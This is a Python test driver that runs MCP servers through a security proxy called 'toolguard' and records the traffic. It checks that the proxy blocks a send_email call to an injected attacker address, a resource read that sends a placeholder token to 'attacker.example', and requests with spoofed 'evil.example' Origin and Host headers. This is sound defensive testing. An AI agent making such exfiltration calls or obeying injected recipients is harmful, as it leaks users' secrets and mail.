"""Drive real Streamable HTTP MCP servers through the toolguard proxy and record the traffic.

Run inside the capture image (see ../README.md). Every scenario launches

    client  <->  TCP tap  <->  toolguard mcp-proxy --listen  <->  TCP tap  <->  real server

(or, for the stdio front, a stdio tap and a stdio server behind the proxy), so the taps
record the bytes that crossed both ends of the proxy. Clients are the official Python
SDK (``mcp``) over Streamable HTTP or, for malformed input that the SDK never sends, raw
``http.client`` requests. Each scenario checks its own expectations; failures are listed
in ``summary.json``.

Usage: ``python driver.py OUT_DIR [SCENARIO...]``
"""

from __future__ import annotations

import asyncio
import contextlib
import http.client
import json
import os
import socket
import subprocess
import sys
import time
import traceback
from collections.abc import Iterator
from pathlib import Path
from typing import Any

from mcp import Client
from mcp.client.streamable_http import streamable_http_client
from mcp.shared._httpx_utils import create_mcp_http_client
from mcp.shared.exceptions import MCPError
from mcp_types import CreateMessageResult, ElicitResult, TextContent

sys.path.insert(0, "/toolguard/src")  # toolguard is pure standard library
from toolguard.store import Store

CAPTURE = Path(__file__).resolve().parent
TCPTAP = str(CAPTURE / "tcptap.py")
STDIO_TAP = "/stdio-capture/tap.py"  # The stdio tap of the stdio captures
PYTHON = "/usr/local/bin/python3"  # Runs the taps and toolguard (pure standard library)
CLIENT_PYTHON = "/opt/client/bin/python"
WORK = Path("/work")
DB = str(WORK / "guard.db")
ATTACKER = "billing@evil-payments.example"
TOKEN = "placeholder-token-0123456789abcdef"  # Not a secret: a marker in a fake .env file
BEARER = "Bearer placeholder-bearer-0123456789abcdef"  # Not a credential: no server checks it

UPSTREAM, UPSTREAM_TAP, PROXY, CLIENT_TAP = 3101, 3201, 3301, 3401
URL = f"http://127.0.0.1:{CLIENT_TAP}/mcp"

SERVERS = {
    "everything": ["mcp-server-everything", "streamableHttp"],
    "mail": [CLIENT_PYTHON, str(CAPTURE / "mail_http_server.py"), str(UPSTREAM)],
    "mail-json": [
        CLIENT_PYTHON,
        str(CAPTURE / "mail_http_server.py"),
        str(UPSTREAM),
        "--stateless",
        "--json",
    ],
}


class Failed(AssertionError):
    """A scenario expectation that did not hold."""


def check(condition: bool, what: str) -> None:
    if not condition:
        raise Failed(what)


def environment(**extra: str) -> dict[str, str]:
    return {
        "PYTHONPATH": "/toolguard/src",
        "TOOLGUARD_HOME": str(WORK / "home"),
        "PATH": os.environ["PATH"],
        "HOME": os.environ.get("HOME", "/home/driver"),
        "LANG": "C.UTF-8",
        **extra,
    }


def wait_port(port: int, timeout: float = 30.0) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            socket.create_connection(("127.0.0.1", port), 0.5).close()
            return
        except OSError:
            time.sleep(0.05)
    raise Failed(f"nothing listens on port {port}")


class Stack:
    """The processes of one scenario: server, taps and proxy."""

    def __init__(self, out: Path, scenario: str, server: str, *, stdio: bool = False) -> None:
        self.out, self.scenario, self.server, self.stdio = out, scenario, server, stdio
        self.procs: list[subprocess.Popen[bytes]] = []
        self.proxy: subprocess.Popen[bytes] | None = None
        self.session = f"live-{scenario}"

    def start(self, args: list[str], **kwargs: Any) -> subprocess.Popen[bytes]:
        proc = subprocess.Popen(args, env=environment(**kwargs.pop("env", {})), **kwargs)
        self.procs.append(proc)
        return proc

    def tap(self, side: str, listen: int, target: int) -> None:
        log = str(self.out / f"{self.scenario}.{side}.jsonl")
        proc = self.start([PYTHON, TCPTAP, log, str(listen), str(target)], stdout=subprocess.PIPE)
        assert proc.stdout is not None
        check(proc.stdout.readline().strip() == b"ready", f"{side} tap started")

    def __enter__(self) -> Stack:
        proxy = [PYTHON, "-m", "toolguard", "mcp-proxy", "--server-name", self.server]
        proxy += ["--session", self.session, "--db", DB, "--listen", f"127.0.0.1:{PROXY}"]
        proxy += ["--allow-host", f"127.0.0.1:{CLIENT_TAP}"]
        if self.stdio:
            log = str(self.out / f"{self.scenario}.server.jsonl")
            proxy += ["--", PYTHON, STDIO_TAP, log, "--", *SERVERS[self.server]]
        else:
            self.start(
                SERVERS[self.server],
                env={"PORT": str(UPSTREAM)},
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            wait_port(UPSTREAM)
            self.tap("upstream", UPSTREAM_TAP, UPSTREAM)
            proxy += ["--upstream", f"http://127.0.0.1:{UPSTREAM_TAP}/mcp"]
        self.proxy = self.start(proxy, stderr=subprocess.PIPE)
        wait_port(PROXY)
        self.tap("client", CLIENT_TAP, PROXY)
        return self

    def __exit__(self, *exc: object) -> None:
        time.sleep(0.3)  # Let the taps log the last bytes in flight
        for proc in reversed(self.procs):
            proc.terminate()
        for proc in reversed(self.procs):
            try:
                proc.wait(10)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
        assert self.proxy is not None and self.proxy.stderr is not None
        self.stderr = self.proxy.stderr.read().decode("utf-8", "replace")
        check("placeholder-bearer" not in self.stderr, "the proxy printed no credential")

    def observations(self) -> list[list[Any]]:
        store = Store(DB)
        return [[o.tool, o.kind, o.untrusted, o.private] for o in store.observations(self.session)]

    def decisions(self) -> list[list[Any]]:
        found = []
        for row in Store(DB).iter_audit():
            body = json.loads(row["body"])
            data = body.get("data", {})
            if body.get("session") == self.session and body.get("event") == "decision":
                found.append([data["tool"], data["action"], data["effective"]])
        return found


@contextlib.contextmanager
def no_bearer_in_audit() -> Iterator[None]:
    yield
    text = "\n".join(row["body"] for row in Store(DB).iter_audit())
    check("placeholder-bearer" not in text, "the audit log holds no credential")


def text_of(result: Any) -> str:
    """Return the text blocks of an SDK CallToolResult."""
    return " ".join(b.text for b in result.content if getattr(b, "type", None) == "text")


async def sampling(_ctx: Any, _params: Any) -> CreateMessageResult:
    return CreateMessageResult(
        role="assistant",
        content=TextContent(type="text", text="A canned answer from the scripted client."),
        model="scripted-client",
        stopReason="endTurn",
    )


class Elicitations:
    """Answers elicitation requests from a script and keeps what was asked."""

    def __init__(self, answers: list[ElicitResult]) -> None:
        self.answers = list(answers)
        self.asked: list[str] = []

    async def __call__(self, _ctx: Any, params: Any) -> ElicitResult:
        self.asked.append(params.message.split("\n", 1)[0])
        return self.answers.pop(0) if self.answers else ElicitResult(action="decline")


APPROVE = ElicitResult(action="accept", content={"approve": True})


def observe_secret(session: str) -> None:
    """Record a .env read in the session, as another integration of the same agent would."""
    subprocess.run(
        [
            PYTHON,
            "-m",
            "toolguard",
            "observe",
            "Read",
            "--session",
            session,
            "--db",
            DB,
            "--args",
            json.dumps({"file_path": "/work/app/.env"}),
        ],
        input=f"API_TOKEN={TOKEN}\n".encode(),
        env=environment(),
        check=True,
    )


# --------------------------------------------------------------------------- raw HTTP


def raw(
    method: str, body: bytes | None = None, declared: int | None = None, **headers: str
) -> tuple[int, dict[str, str], bytes]:
    """Send one request through the client tap and return status, headers and body.

    ``declared`` sends only the headers, announcing a body of that many bytes.
    """
    conn = http.client.HTTPConnection("127.0.0.1", CLIENT_TAP, timeout=30)
    names = {"Content_Type": "Content-Type", "Mcp_Session_Id": "Mcp-Session-Id"}
    sent = {"Host": f"127.0.0.1:{CLIENT_TAP}", "Accept": "application/json, text/event-stream"}
    sent.update({names.get(k, k.replace("_", "-")): v for k, v in headers.items()})
    conn.putrequest(method, sent.pop("Path", "/mcp"), skip_host=True, skip_accept_encoding=True)
    for name, value in sent.items():
        conn.putheader(name, value)
    if body is not None or declared is not None:
        conn.putheader("Content-Length", str(declared if declared is not None else len(body)))
    conn.endheaders(body)
    response = conn.getresponse()
    data = response.read()
    conn.close()
    return response.status, {k.lower(): v for k, v in response.getheaders()}, data


def rpc(request_id: Any, method: str, params: Any = None) -> bytes:
    message: dict[str, Any] = {"jsonrpc": "2.0", "id": request_id, "method": method}
    if params is not None:
        message["params"] = params
    return json.dumps(message).encode()


# --------------------------------------------------------------------------- scenarios


async def everything(out: Path) -> dict[str, Any]:
    """TypeScript SDK reference server: discovery fallback, SSE, progress, server requests."""
    asked = Elicitations([ElicitResult(action="accept", content={"name": "Ada"})])
    progress: list[float] = []
    logs: list[str] = []

    async def on_progress(value: float, total: float | None, message: str | None) -> None:
        progress.append(value)

    async def on_log(params: Any) -> None:
        logs.append(params.level)

    with Stack(out, "everything", "everything") as stack:
        async with Client(
            URL,
            mode="auto",
            elicitation_callback=asked,
            sampling_callback=sampling,
            logging_callback=on_log,
            read_timeout_seconds=60,
        ) as c:
            tools = [t.name for t in (await c.list_tools()).tools]
            prompts = [p.name for p in (await c.list_prompts()).prompts]
            echo = await c.call_tool("echo", {"message": "hello over HTTP"})
            structured = await c.call_tool("get-structured-content", {"location": "Chicago"})
            static = await c.read_resource("demo://resource/static/document/instructions.md")
            templated = await c.read_resource("demo://resource/dynamic/text/1")
            prompt = await c.get_prompt("args-prompt", {"city": "Lisbon", "state": "Lisboa"})
            long = await c.call_tool(
                "trigger-long-running-operation",
                {"duration": 1, "steps": 3},
                progress_callback=on_progress,
            )
            elicited = await c.call_tool("trigger-elicitation-request", {})
            sampled = await c.call_tool(
                "trigger-sampling-request", {"prompt": "Say hi", "maxTokens": 20}
            )
            await c.set_logging_level("debug")
            await c.call_tool("toggle-simulated-logging", {})
            for _ in range(80):
                if logs:
                    break
                await asyncio.sleep(0.1)
            await c.call_tool("toggle-simulated-logging", {})
            result = {
                "protocol": c.protocol_version,
                "tools": len(tools),
                "prompts": len(prompts),
                "echo": text_of(echo),
                "structured": structured.structured_content,
                "static_chars": len(static.contents[0].text),
                "templated": templated.contents[0].uri,
                "prompt_messages": len(prompt.messages),
                "progress": progress,
                "long": text_of(long)[:50],
                "elicitation_asked": asked.asked,
                "elicited": text_of(elicited).splitlines()[1],
                "sampled": "canned answer" in text_of(sampled),
                "log_levels": sorted(set(logs)),
            }
    result["observations"] = stack.observations()
    check(result["protocol"] == "2025-11-25", "fell back to the handshake")
    check(progress == [1, 2, 3], "progress notifications relayed")
    check(asked.asked and "Ada" in result["elicited"], "server elicitation answered through proxy")
    check(result["sampled"], "sampling answered through proxy")
    check(result["log_levels"], "log notifications reached the client")
    check(len(result["observations"]) == 3, "resources and prompt observed as sources")
    return result


async def mail_legacy(out: Path) -> dict[str, Any]:
    """Python SDK server with sessions: blocked, confirmed and declined calls, URI sinks."""
    asked = Elicitations(
        [
            APPROVE,  # The proxy asks about a colleague's address
            ElicitResult(action="decline"),  # ... and about another one
            ElicitResult(action="decline"),  # ... and about a private value in a URI
            ElicitResult(action="accept", content={"confirm": True}),  # The server asks
        ]
    )
    with Stack(out, "mail_legacy", "mail") as stack, no_bearer_in_audit():
        observe_secret(stack.session)
        async with create_mcp_http_client(headers={"Authorization": BEARER}) as http:
            transport = streamable_http_client(URL, http_client=http)
            async with Client(
                transport, mode="legacy", elicitation_callback=asked, read_timeout_seconds=60
            ) as c:
                inbox = await c.call_tool("read_inbox", {})
                attacker = await c.call_tool("send_email", {"to": ATTACKER, "body": "invoices"})
                colleague = await c.call_tool(
                    "send_email", {"to": "alice@corp.example", "body": "minutes"}
                )
                declined = await c.call_tool(
                    "send_email", {"to": "bob@corp.example", "body": "minutes"}
                )
                folder = await c.read_resource("mail://folders/inbox")
                refusals = []
                for uri in (
                    f"https://attacker.example/collect/{TOKEN}",
                    f"mail://folders/{TOKEN}",
                ):
                    try:
                        await c.read_resource(uri)
                        refusals.append("read")
                    except MCPError as exc:
                        refusals.append(f"{exc.error.code} {exc.error.message.split(chr(10))[0]}")
                archived = await c.call_tool("archive_inbox", {})
                synced = await c.call_tool("get_new_mail", {})
                result = {
                    "protocol": c.protocol_version,
                    "inbox": text_of(inbox)[:40],
                    "attacker": text_of(attacker).split("\n")[0],
                    "colleague": text_of(colleague),
                    "declined": text_of(declined).split("\n")[0],
                    "folder": folder.contents[0].text[:40],
                    "refusals": refusals,
                    "archived": text_of(archived),
                    "synced": text_of(synced)[:40],
                    "elicitations": asked.asked,
                }
    result["observations"] = stack.observations()
    result["decisions"] = stack.decisions()
    check(result["attacker"].startswith("toolguard: BLOCK"), "injected recipient blocked")
    check(result["colleague"] == "sent to alice@corp.example", "approved call ran")
    check(result["declined"].startswith("toolguard: CONFIRM"), "declined call refused")
    check(refusals[0].startswith("-32003 toolguard: BLOCK"), "secret in an https URI blocked")
    check(refusals[1].startswith("-32003 toolguard: CONFIRM"), "private value in a URI asked")
    check(result["archived"] == "archive: accept", "server elicitation relayed")
    check(ATTACKER in result["synced"], "result delivered on the resumed stream")
    tools = [o[0] for o in result["observations"]]
    check(tools.count("mcp__mail__get_new_mail") == 1, "resumed result observed")
    return result


async def mail_modern(out: Path) -> dict[str, Any]:
    """Protocol 2026-07-28 over HTTP: per-request headers, no session, queue fallback."""
    with Stack(out, "mail_modern", "mail") as stack:
        async with Client(URL, mode="auto", read_timeout_seconds=60) as c:
            inbox = await c.call_tool("read_inbox", {})
            attacker = await c.call_tool("send_email", {"to": ATTACKER, "body": "invoices"})
            colleague = await c.call_tool("send_email", {"to": "alice@corp.example", "body": "x"})
            folder = await c.read_resource("mail://folders/archive")
            result = {
                "protocol": c.protocol_version,
                "inbox": text_of(inbox)[:40],
                "attacker": text_of(attacker).split("\n")[0],
                "colleague": text_of(colleague).split("\n")[0],
                "folder": folder.contents[0].text,
            }
    result["observations"] = stack.observations()
    check(result["protocol"] == "2026-07-28", "negotiated the stateless revision")
    check(result["attacker"].startswith("toolguard: BLOCK"), "injected recipient blocked")
    check(result["colleague"].startswith("toolguard: CONFIRM"), "confirmation fails closed")
    return result


async def mail_stateless(out: Path) -> dict[str, Any]:
    """Python SDK server without sessions, answering plain JSON bodies."""
    with Stack(out, "mail_stateless", "mail-json") as stack:
        async with Client(URL, mode="legacy", read_timeout_seconds=60) as c:
            inbox = await c.call_tool("read_inbox", {})
            attacker = await c.call_tool("send_email", {"to": ATTACKER, "body": "invoices"})
            result = {
                "protocol": c.protocol_version,
                "inbox": text_of(inbox)[:40],
                "attacker": text_of(attacker).split("\n")[0],
            }
    result["observations"] = stack.observations()
    check(result["attacker"].startswith("toolguard: BLOCK"), "injected recipient blocked")
    return result


async def protocol(out: Path) -> dict[str, Any]:
    """Raw requests the SDK never sends: what the proxy refuses and what it relays."""
    found: dict[str, Any] = {}
    init = {
        "protocolVersion": "2025-11-25",
        "capabilities": {},
        "clientInfo": {"name": "raw", "version": "1"},
    }
    with Stack(out, "protocol", "mail"):
        ok = {"Content_Type": "application/json"}
        found["bad_origin"] = raw(
            "POST", rpc(1, "initialize", init), Origin="http://evil.example", **ok
        )[0]
        found["bad_host"] = raw("POST", rpc(1, "initialize", init), Host="evil.example", **ok)[0]
        found["bad_path"] = raw("POST", rpc(1, "ping"), Path="/other", **ok)[0]
        found["bad_type"] = raw("POST", rpc(1, "ping"), Content_Type="text/plain")[0]
        found["not_json"] = raw("POST", b"{oops", **ok)[0]
        found["batch"] = raw("POST", b"[" + rpc(1, "ping") + b"]", **ok)[0]
        found["oversized"] = raw("POST", declared=5 * 1024 * 1024, **ok)[0]
        found["put"] = raw("PUT", b"", **ok)[0]
        status, headers, _ = raw(
            "POST", rpc(1, "initialize", init), Origin="http://localhost:6274", **ok
        )
        session = headers["mcp-session-id"]
        found["loopback_origin"] = status
        common = {**ok, "Mcp_Session_Id": session, "Mcp-Protocol-Version": "2025-11-25"}
        note = json.dumps({"jsonrpc": "2.0", "method": "notifications/initialized"}).encode()
        found["initialized"] = raw("POST", note, **common)[0]
        status, _, body = raw(
            "POST",
            rpc(2, "tools/call", {"name": "read_inbox"}),
            **{**common, "Mcp-Name": "send_email"},
        )
        found["name_mismatch"] = [status, json.loads(body)["error"]["code"]]
        status, _, body = raw("POST", rpc(3, "tools/call", {"name": "read_inbox"}), **common)
        found["call"] = [status, ATTACKER in body.decode()]
        status, _, body = raw(
            "POST", rpc(4, "tools/call", {"name": "bogus", "arguments": []}), **common
        )
        found["bad_params"] = [status, json.loads(body)["error"]["code"]]
        status, _, body = raw("POST", rpc(5, "ping"), **{**common, "Mcp_Session_Id": "unknown"})
        found["unknown_session"] = status
        found["delete"] = raw("DELETE", None, **common)[0]
        found["after_delete"] = raw("POST", rpc(6, "ping"), **common)[0]
    check(found["bad_origin"] == 403 and found["bad_host"] == 421, "DNS-rebinding protection")
    check(found["oversized"] == 413 and found["batch"] == 400, "size and batch limits")
    check(found["name_mismatch"] == [400, -32020], "routing header mismatch refused")
    check(found["call"] == [200, True] and found["delete"] == 200, "session lifecycle")
    check(found["after_delete"] == 404, "the upstream ended the session")
    return found


async def stdio_front(out: Path) -> dict[str, Any]:
    """An HTTP front for a stdio server: proxy-issued sessions and message routing."""
    asked = Elicitations([ElicitResult(action="decline")])
    progress: list[float] = []
    logs: list[str] = []

    async def on_progress(value: float, total: float | None, message: str | None) -> None:
        progress.append(value)

    async def on_log(params: Any) -> None:
        logs.append(params.level)

    with Stack(out, "stdio_front", "everything-stdio", stdio=True) as stack:
        async with Client(
            URL,
            mode="legacy",
            elicitation_callback=asked,
            sampling_callback=sampling,
            logging_callback=on_log,
            read_timeout_seconds=60,
        ) as c:
            echo = await c.call_tool("echo", {"message": "hello stdio"})
            static = await c.read_resource("demo://resource/static/document/instructions.md")
            long = await c.call_tool(
                "trigger-long-running-operation",
                {"duration": 1, "steps": 2},
                progress_callback=on_progress,
            )
            elicited = await c.call_tool("trigger-elicitation-request", {})
            sampled = await c.call_tool(
                "trigger-sampling-request", {"prompt": "Say hi", "maxTokens": 20}
            )
            await c.set_logging_level("debug")
            await c.call_tool("toggle-simulated-logging", {})
            for _ in range(80):
                if logs:
                    break
                await asyncio.sleep(0.1)
            await c.call_tool("toggle-simulated-logging", {})
            result = {
                "protocol": c.protocol_version,
                "echo": text_of(echo),
                "static_chars": len(static.contents[0].text),
                "progress": progress,
                "long": text_of(long)[:50],
                "elicitation_asked": asked.asked,
                "elicited": text_of(elicited)[:60],
                "sampled": "canned answer" in text_of(sampled),
                "log_levels": sorted(set(logs)),
            }
    result["observations"] = stack.observations()
    check(progress == [1, 2], "progress routed to its request")
    check(asked.asked, "server elicitation routed to the client")
    check(result["sampled"], "sampling routed to the client")
    check(result["log_levels"], "unrelated notifications reached the GET stream")
    return result


SERVERS["everything-stdio"] = ["mcp-server-everything", "stdio"]
SCENARIOS = [everything, mail_legacy, mail_modern, mail_stateless, protocol, stdio_front]


def versions() -> dict[str, str]:
    """Return the versions of the client, the servers and their SDKs in this image."""
    # The hostname (the container id) is only used by build.py to check it is not leaked.
    found = {"python": sys.version.split()[0], "hostname": socket.gethostname()}
    node = subprocess.run(["/usr/local/bin/node", "--version"], capture_output=True, check=False)
    found["node"] = node.stdout.decode().strip()
    modules = Path("/usr/local/lib/node_modules/@modelcontextprotocol")
    package = json.loads((modules / "server-everything/package.json").read_text("utf-8"))
    found["@modelcontextprotocol/server-everything"] = package["version"]
    sdk = modules / "server-everything/node_modules/@modelcontextprotocol/sdk/package.json"
    found["@modelcontextprotocol/sdk (server-everything)"] = json.loads(sdk.read_text("utf-8"))[
        "version"
    ]
    site = next(Path("/opt/client/lib").glob("python*/site-packages"))
    for name in ("mcp", "uvicorn", "starlette"):
        dist = next(site.glob(f"{name}-*.dist-info"))
        found[f"{name} (client)"] = dist.name.split("-")[1].removesuffix(".dist")
    return found


async def main(out_dir: str, only: list[str]) -> int:
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    (WORK / "home").mkdir(exist_ok=True)
    entries = []
    for scenario in SCENARIOS:
        if only and scenario.__name__ not in only:
            continue
        entry: dict[str, Any] = {"scenario": scenario.__name__}
        started = time.monotonic()
        try:
            entry["result"] = await asyncio.wait_for(scenario(out), 180)
            entry["ok"] = True
        except Exception as exc:
            entry["ok"] = False
            entry["error"] = f"{type(exc).__name__}: {exc}"
            entry["trace"] = traceback.format_exc()[-3000:]
        entry["seconds"] = round(time.monotonic() - started, 1)
        entries.append(entry)
        status = "ok" if entry["ok"] else "FAILED " + entry["error"]
        print(f"{scenario.__name__}: {status}", flush=True)
    summary = {"versions": versions(), "entries": entries}
    (out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n", encoding="utf-8")
    return 0 if all(e["ok"] for e in entries) else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main(sys.argv[1] if len(sys.argv) > 1 else "/out", sys.argv[2:])))
